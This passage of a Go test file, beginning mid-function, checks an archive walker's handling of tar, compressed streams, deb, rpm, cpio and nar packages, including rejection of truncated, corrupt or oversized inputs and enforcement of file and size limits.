	if f := w.files["conanfile.py"]; f.Size != int64(len(script)) || f.Truncated || f.Synthetic {
		t.Errorf("entry = %+v", f)
	}

	// A nameless artifact is "content"; a large one is cut and keeps its size.
	w = walkBytes(t, []byte("\x7fELF\x02\x01\x01"), testLimits, ArchiveOptions{SingleFile: true})
	if !reflect.DeepEqual(w.names, []string{"content"}) {
		t.Errorf("nameless single file: members = %v", w.names)
	}
	lim := testLimits
	lim.MaxFileBytes = 10
	w = walkBytes(t, script, lim, ArchiveOptions{Filename: "conanfile.py", SingleFile: true})
	if f := w.files["conanfile.py"]; !f.Truncated || f.Size != int64(len(script)) || len(w.content["conanfile.py"]) != 10 || !hasReason(w.stats, IncompleteFileBytes) {
		t.Errorf("cut single file = %+v (%d bytes kept), incomplete=%v", f, len(w.content["conanfile.py"]), w.stats.Incomplete)
	}
	// One larger than the input cap is reported for what was read, and says so.
	lim = testLimits
	lim.MaxArchiveBytes = 16
	w = walkBytes(t, script, lim, ArchiveOptions{Filename: "conanfile.py", SingleFile: true})
	if w.err != nil || len(w.names) != 1 || !hasReason(w.stats, IncompleteArchiveBytes) {
		t.Errorf("single file over the input cap: err=%v members=%v incomplete=%v", w.err, w.names, w.stats.Incomplete)
	}
	// Nothing at all is an archive with nothing in it.
	w = walkBytes(t, nil, testLimits, ArchiveOptions{SingleFile: true})
	if w.err != nil || len(w.names) != 0 {
		t.Errorf("empty content: err=%v members=%v", w.err, w.names)
	}
}

func TestPeelCompression(t *testing.T) {
	text := []byte("Package: hello\nVersion: 1.0\nFilename: pool/main/h/hello/hello_1.0_all.deb\n")
	tarball := tarOf(map[string]string{"pkg/setup.py": "import os\n"})
	long := bytes.Repeat([]byte("0123456789abcdef"), 4096) // 64 KiB of text

	type want struct {
		layers    int
		ok        bool
		container bool   // the innermost content is an archive
		prefix    string // what the innermost content starts with
	}
	for name, tc := range map[string]struct {
		in   []byte
		want want
	}{
		"plain text":          {text, want{0, true, false, "Package: hello"}},
		"plain tar":           {tarball, want{0, true, true, "pkg/setup.py"}},
		"deb":                 {fixture(t, "pthello-xz.deb"), want{0, true, true, "!<arch>"}},
		"gzip of text":        {gzipOf(text), want{1, true, false, "Package: hello"}},
		"gzip of long text":   {gzipOf(long), want{1, true, false, "0123456789abcdef"}},
		"gzip of a tar":       {gzipOf(tarball), want{1, true, true, "pkg/setup.py"}},
		"xz of text":          {xzOf(t, text), want{1, true, false, "Package: hello"}},
		"xz of a tar":         {fixture(t, "hello.tar.xz"), want{1, true, true, "hello/"}},
		"zstd of text":        {zstdOf(t, text), want{1, true, false, "Package: hello"}},
		"zstd of a tar":       {fixture(t, "hello.tar.zst"), want{1, true, true, "hello/"}},
		"bzip2 of a tar":      {fixture(t, "hello.tar.bz2"), want{1, true, true, "hello/"}},
		"lzma of a tar":       {fixture(t, "hello.tar.lzma"), want{1, true, true, "hello/"}},
		"gzip of a script":    {fixture(t, "install.sh.gz"), want{1, true, false, "#!/bin/sh"}},
		"gzip of gzip of tar": {gzipOf(gzipOf(tarball)), want{2, true, true, "pkg/setup.py"}},
		"empty gzip":          {gzipOf(nil), want{1, true, false, ""}},
		"nothing":             {nil, want{0, true, false, ""}},
	} {
		head, layers, ok := PeelCompression(tc.in)
		if layers != tc.want.layers || ok != tc.want.ok {
			t.Errorf("%s: layers=%d ok=%v, want %d %v", name, layers, ok, tc.want.layers, tc.want.ok)
			continue
		}
		if len(head) > 512 {
			t.Errorf("%s: head is %d bytes, more than one tar block", name, len(head))
		}
		if !bytes.HasPrefix(head, []byte(tc.want.prefix)) {
			t.Errorf("%s: innermost content starts %q, want prefix %q", name, head[:min(len(head), 24)], tc.want.prefix)
		}
		if got := Recognizes(head); got != tc.want.container {
			t.Errorf("%s: innermost content recognized as an archive = %v, want %v", name, got, tc.want.container)
		}
	}

	// "Cannot tell" is never reported as "nothing there".
	gzTar := gzipOf(tarball)
	manyEmptyBlocks := append([]byte{0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 3}, bytes.Repeat([]byte{0x00, 0x00, 0x00, 0xff, 0xff}, 4096)...)
	tooDeep := tarball
	for i := 0; i <= maxCompressionLayers; i++ {
		tooDeep = gzipOf(tooDeep)
	}
	bigDict := append([]byte(nil), fixture(t, "hello.tar.xz")...)
	bigDict[16] = 40
	for name, in := range map[string][]byte{
		"gzip cut off before a full block":   gzipOf(long)[:40],
		"gzip of a tar cut off mid-header":   gzTar[:len(gzTar)/3],
		"gzip that yields nothing for long":  manyEmptyBlocks,
		"corrupt gzip":                       append([]byte{0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 3}, bytes.Repeat([]byte{0xff}, 64)...),
		"more layers than are followed":      tooDeep,
		"xz asking for a 4 GiB dictionary":   bigDict,
		"xz with an unsupported filter":      fixture(t, "hello-bcj.tar.xz"),
		"zstd asking for a 1 GiB window":     {0x28, 0xb5, 0x2f, 0xfd, 0x00, 0xa0, 0x01, 0x00, 0x00},
		"truncated xz":                       fixture(t, "hello.tar.xz")[:60],
		"second layer cut off by the window": gzipOf(gzipOf(long)),
	} {
		if head, _, ok := PeelCompression(in); ok {
			// The last case is decidable only if 512 bytes of the inner stream
			// happen to decode to a full block; either answer is honest there.
			if name == "second layer cut off by the window" && len(head) == 512 {
				continue
			}
			t.Errorf("%s: reported as decided, with head %q", name, head[:min(len(head), 24)])
		}
	}

	// A short stream that ends cleanly is decided, however short.
	for _, in := range [][]byte{gzipOf([]byte("x")), xzOf(t, []byte("tiny")), zstdOf(t, []byte("tiny"))} {
		if head, layers, ok := PeelCompression(in); !ok || layers != 1 || len(head) == 0 {
			t.Errorf("short clean stream: head=%q layers=%d ok=%v", head, layers, ok)
		}
	}
}

func TestRecognizes(t *testing.T) {
	for _, file := range []string{"hello.tar.xz", "hello.tar.zst", "hello.tar.lzma", "hello.tar.bz2", "pthello-xz.deb", "pthello-zstd.rpm", "hello.nar", "hello-newc.cpio", "install.sh.gz", "plain.a"} {
		if !Recognizes(fixture(t, file)[:64]) && !Recognizes(fixture(t, file)) {
			t.Errorf("%s is not recognized", file)
		}
	}
	for name, head := range map[string][]byte{"text": []byte("Metadata-Version: 2.1\n"), "xml": []byte("<?xml version=\"1.0\"?>"), "elf": {0x7f, 'E', 'L', 'F'}, "empty": nil} {
		if Recognizes(head) {
			t.Errorf("%s was recognized as an archive", name)
		}
	}
}

func TestLZMA2DictSize(t *testing.T) {
	for prop, want := range map[byte]int64{0: 4 << 10, 1: 6 << 10, 2: 8 << 10, 22: 8 << 20, 23: 12 << 20, 28: 64 << 20, 39: 3 << 30, 40: 1<<32 - 1} {
		got, ok := lzma2DictSize(prop)
		if !ok || got != want {
			t.Errorf("lzma2DictSize(%d) = %d, %v; want %d", prop, got, ok, want)
		}
	}
	for _, prop := range []byte{41, 63, 64, 0x80, 0xff} {
		if _, ok := lzma2DictSize(prop); ok {
			t.Errorf("lzma2DictSize(%d) accepted a reserved value", prop)
		}
	}
}

func TestXZVarint(t *testing.T) {
	for _, tc := range []struct {
		in   []byte
		v    uint64
		n    int
		okay bool
	}{
		{[]byte{0x00}, 0, 1, true},
		{[]byte{0x7f}, 127, 1, true},
		{[]byte{0x80, 0x01}, 128, 2, true},
		{[]byte{0xff, 0x7f, 0xaa}, 16383, 2, true},
		{[]byte{0x80}, 0, 0, false},                                                      // continuation with nothing after it
		{bytes.Repeat([]byte{0x80}, 10), 0, 0, false},                                    // longer than nine bytes
		{[]byte{0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x01}, 1 << 56, 9, true}, // the full nine
		{nil, 0, 0, false},
	} {
		v, n, ok := xzVarint(tc.in)
		if v != tc.v || n != tc.n || ok != tc.okay {
			t.Errorf("xzVarint(% x) = %d, %d, %v; want %d, %d, %v", tc.in, v, n, ok, tc.v, tc.n, tc.okay)
		}
	}
}

func TestXZReaderRejectsMalformedStreams(t *testing.T) {
	good := fixture(t, "hello.tar.xz")
	mutate := func(f func(b []byte) []byte) []byte { return f(append([]byte(nil), good...)) }
	for name, data := range map[string][]byte{
		"reserved stream flag":    mutate(func(b []byte) []byte { b[6] = 1; return b }),
		"reserved check nibble":   mutate(func(b []byte) []byte { b[7] |= 0x10; return b }),
		"reserved block flags":    mutate(func(b []byte) []byte { b[13] = 0x04; return b }),
		"two filters":             mutate(func(b []byte) []byte { b[13] = 0x01; return b }),
		"unknown filter":          mutate(func(b []byte) []byte { b[14] = 0x03; return b }),
		"wrong properties size":   mutate(func(b []byte) []byte { b[15] = 2; return b }),
		"truncated block header":  good[:15],
		"truncated stream header": good[:8],
	} {
		t.Run(name, func(t *testing.T) {
			w := walkBytes(t, data, testLimits, ArchiveOptions{})
			if w.err == nil {
				t.Errorf("formatWalk as an archive: members = %v", w.names)
			}
			if len(w.names) != 0 {
				t.Errorf("members were produced: %v", w.names)
			}
		})
	}

	// A stream cut short inside its payload yields what could be decoded and no
	// more; cut inside the index it still yields the whole archive.
	w := walkBytes(t, good[:len(good)-20], testLimits, ArchiveOptions{})
	if w.err != nil || len(w.names) != 2 {
		t.Errorf("cut in the index: err=%v members=%v", w.err, w.names)
	}

	// Our own writer's output round-trips, including an empty payload.
	for _, payload := range [][]byte{nil, []byte("x"), bytes.Repeat([]byte("abcdefgh"), 5000)} {
		var out bytes.Buffer
		x, err := newXZReader(bufioReader(xzOf(t, payload)), maxLZMADictBytes)
		if err != nil {
			t.Fatalf("newXZReader: %v", err)
		}
		if _, err := io.Copy(&out, x); err != nil {
			t.Fatalf("decode: %v", err)
		}
		if !bytes.Equal(out.Bytes(), payload) {
			t.Errorf("round trip of %d bytes produced %d bytes", len(payload), out.Len())
		}
	}
}

func TestSniffContainer(t *testing.T) {
	tarBlock := tarOf(map[string]string{"a": "b"})[:512]
	for name, tc := range map[string]struct {
		head []byte
		want container
	}{
		"gzip":             {[]byte{0x1f, 0x8b, 8}, containerGzip},
		"bzip2":            {[]byte("BZh91AY"), containerBzip2},
		"bzip2 bad level":  {[]byte("BZh0xxx"), containerNone},
		"xz":               {[]byte("\xfd7zXZ\x00\x00\x04"), containerXz},
		"zstd":             {[]byte{0x28, 0xb5, 0x2f, 0xfd, 0}, containerZstd},
		"zstd skippable":   {[]byte{0x5a, 0x2a, 0x4d, 0x18, 0}, containerZstd},
		"not skippable":    {[]byte{0x6a, 0x2a, 0x4d, 0x18, 0}, containerNone},
		"zip":              {[]byte("PK\x03\x04rest"), containerZip},
		"empty zip":        {[]byte("PK\x05\x06rest"), containerZip},
		"zip directory":    {[]byte("PK\x01\x02rest"), containerNone},
		"ar":               {[]byte("!<arch>\ndebian"), containerAr},
		"rpm":              {[]byte{0xed, 0xab, 0xee, 0xdb, 3, 0}, containerRPM},
		"cpio newc":        {[]byte("070701000"), containerCpio},
		"cpio crc":         {[]byte("070702000"), containerCpio},
		"cpio odc":         {[]byte("070707000"), containerCpio},
		"cpio stripped":    {[]byte("07070X000"), containerCpio},
		"cpio other digit": {[]byte("070703000"), containerNone},
		"nar":              {append(append([]byte(nil), narMagic...), 1, 0), containerNAR},
		"nar cut short":    {narMagic[:20], containerNone},
		"tar":              {tarBlock, containerTar},
		"tar cut short":    {tarBlock[:511], containerNone},
		"empty tar":        {make([]byte, 512), containerTar},
		"text":             {[]byte("#!/bin/sh\necho hi\n"), containerNone},
		"json":             {[]byte(`{"name": "x"}`), containerNone},
		"nothing":          {nil, containerNone},
		"lzma":             {[]byte{0x5d, 0, 0, 0x80, 0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, containerLzma},
	} {
		if got := sniffContainer(tc.head); got != tc.want {
			t.Errorf("%s: sniffContainer = %d, want %d", name, got, tc.want)
		}
	}

	// A tar block with one byte changed no longer sums to its checksum.
	corrupt := append([]byte(nil), tarBlock...)
	corrupt[0] ^= 0x01
	if looksLikeTarBlock(corrupt) {
		t.Error("a tar block with a wrong checksum was accepted")
	}
	// Text that happens to be 512 bytes long is not a tar.
	if looksLikeTarBlock(bytes.Repeat([]byte("a"), 512)) {
		t.Error("512 bytes of text were taken for a tar block")
	}
}

func TestLooksLikeLzmaAlone(t *testing.T) {
	hdr := func(prop byte, dict uint32, size uint64) []byte {
		b := make([]byte, 13)
		b[0] = prop
		binary.LittleEndian.PutUint32(b[1:], dict)
		binary.LittleEndian.PutUint64(b[5:], size)
		return b
	}
	unknown := ^uint64(0)
	for name, tc := range map[string]struct {
		head []byte
		want bool
	}{
		"8 MiB, unknown size":    {hdr(0x5d, 8<<20, unknown), true},
		"4 KiB, known size":      {hdr(0x5d, 1<<12, 1234), true},
		"2^n + 2^(n-1)":          {hdr(0x5d, 3<<20, unknown), true},
		"dictionary too small":   {hdr(0x5d, 1<<11, unknown), false},
		"dictionary not a power": {hdr(0x5d, 5<<20, unknown), false},
		"implausible size":       {hdr(0x5d, 8<<20, 1<<41), false},
		"other properties":       {hdr(0x5e, 8<<20, unknown), false},
		"short":                  {hdr(0x5d, 8<<20, unknown)[:12], false},
		"text starting with ']'": {[]byte("]] some text ..."), false},
	} {
		if got := looksLikeLzmaAlone(tc.head); got != tc.want {
			t.Errorf("%s: looksLikeLzmaAlone = %v, want %v", name, got, tc.want)
		}
	}
}

func TestStripCompressionSuffix(t *testing.T) {
	for in, want := range map[string]string{
		"a.tar.gz": "a.tar", "a.GZ": "a", "x.bz2": "x", "x.xz": "x", "x.zst": "x", "x.zstd": "x", "x.lzma": "x", "x.Z": "x",
		"plain": "plain", ".gz": ".gz", "": "", "a.tgz": "a.tgz",
	} {
		if got := stripCompressionSuffix(in); got != want {
			t.Errorf("stripCompressionSuffix(%q) = %q, want %q", in, got, want)
		}
	}
}

// A walk can be stopped by its visitor at any member, in any container.
func TestVisitorCanStopAnyWalk(t *testing.T) {
	for _, file := range []string{"pthello-xz.deb", "pthello-zstd.rpm", "pthello-v6.rpm", "hello.nar", "hello-newc.cpio", "plain.a", "hello.tar.zst"} {
		seen := 0
		_, err := WalkArtifact(context.Background(), bytes.NewReader(fixture(t, file)), testLimits, ArchiveOptions{},
			func(ArchiveEntry) bool { seen++; return false }, nil)
		if err != nil || seen != 1 {
			t.Errorf("%s: visitor called %d times after asking to stop (err %v)", file, seen, err)
		}
	}
}

// A canceled context ends a walk without an error, in any container.
func TestCanceledWalkYieldsNothing(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	for _, file := range []string{"pthello-xz.deb", "pthello-zstd.rpm", "hello.nar.xz", "hello-newc.cpio.gz", "hello.tar.xz"} {
		seen := 0
		_, err := WalkArtifact(ctx, bytes.NewReader(fixture(t, file)), testLimits, ArchiveOptions{},
			func(e ArchiveEntry) bool {
				if !e.Synthetic {
					seen++
				}
				return true
			}, nil)
		if err != nil || seen != 0 {
			t.Errorf("%s: canceled walk read %d members (err %v)", file, seen, err)
		}
	}
}

// The limits hold in the new containers exactly as in tar and zip.
func TestLimitsApplyInEveryContainer(t *testing.T) {
	lim := testLimits
	// An RPM's composed entries are not members and are not charged; its payload
	// members are.
	for file, max := range map[string]int{"pthello-xz.deb": 3, "hello.nar": 3, "pthello-gzip.rpm": 1, "pthello-v6.rpm": 1} {
		lim.MaxFiles = max
		w := walkBytes(t, fixture(t, file), lim, ArchiveOptions{})
		real := 0
		for _, f := range w.files {
			if !f.Synthetic {
				real++
			}
		}
		// Directories, links and the nested archives themselves are charged too,
		// so fewer files than the limit may come out — never more, and never none.
		if real > max || real < 1 || !hasReason(w.stats, IncompleteFiles) {
			t.Errorf("%s: %d members with MaxFiles=%d, incomplete=%v", file, real, max, w.stats.Incomplete)
		}
		if strings.HasSuffix(file, ".rpm") {
			// The scriptlets are there regardless, and the header's file list
			// covers what the member limit cut off.
			if w.content["RPM/scriptlets/postin"] == "" || w.content["RPM/files.txt"] == "" {
				t.Errorf("%s: composed entries missing under the member limit: %v", file, w.names)
			}
		}
	}

	lim = testLimits
	lim.MaxFileBytes = 8
	w := walkBytes(t, fixture(t, "pthello-xz.deb"), lim, ArchiveOptions{})
	if f := w.files["DEBIAN/postinst"]; !f.Truncated || len(w.content["DEBIAN/postinst"]) != 8 || f.Size != 83 {
		t.Errorf("per-file cap in a .deb: %+v (%d bytes kept)", f, len(w.content["DEBIAN/postinst"]))
	}
	if !hasReason(w.stats, IncompleteFileBytes) {
		t.Errorf("incomplete = %v", w.stats.Incomplete)
	}
	// The cap applies to a composed entry too.
	w = walkBytes(t, fixture(t, "pthello-zstd.rpm"), lim, ArchiveOptions{})
	if f := w.files["RPM/scriptlets/postin"]; !f.Truncated || len(w.content["RPM/scriptlets/postin"]) != 8 || f.Size != 76 {
		t.Errorf("per-file cap on a scriptlet: %+v", f)
	}
}

func bufioReader(data []byte) *bufio.Reader { return bufio.NewReader(bytes.NewReader(data)) }
